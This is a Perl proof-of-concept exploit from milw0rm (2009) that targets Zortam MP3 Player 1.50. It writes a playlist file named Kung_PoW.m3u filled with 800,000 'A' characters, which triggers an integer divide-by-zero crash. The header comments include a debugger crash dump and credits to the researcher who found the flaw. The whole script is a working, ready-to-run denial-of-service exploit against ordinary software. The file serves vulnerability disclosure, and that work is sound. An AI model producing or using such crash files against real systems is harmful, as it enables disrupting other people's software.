#!/usr/bin/perl
#
# Title: Zortam MP3 Player 1.50 (m3u) Integer Division by Zero Vulnerability
# Product Web Page: http://www.zortam.com
# Tested On: Microsoft Windows XP Professional SP3 (English)
#
#
###===---
#
# (1c0.7f8): Integer divide-by-zero - code c0000094 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=0000000d ebx=0019be80 ecx=00000000 edx=00000000 esi=0180f5dc edi=0000000a
# eip=0040f294 esp=0012f588 ebp=0180f570 iopl=0         nv up ei pl nz ac po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210212
# *** ERROR: Symbol file could not be found.  Defaulted to export symbols for zPlayer.exe - 
# zPlayer+0xf294:
# 0040f294 f7f9            idiv    eax,ecx
#
###===---
#
#
# Vulnerability Discovered By Gjoko 'LiquidWorm' Krstic
# liquidworm gmail com
# Zero Science Lab - http://www.zeroscience.org
# 16.07.2009
#

$fle = "Kung_PoW.m3u";
$mna = "A" x 800000;
print "\n\n[+] Creating playlist file: $fle ...\r\n";
sleep 1;
open(m3u, ">./$fle") || die "\n\aCannot open $fle: $!";
print m3u "$mna";
close (m3u);
print "\n[+] Playlist file successfully created!\r\n";

# milw0rm.com [2009-07-16]
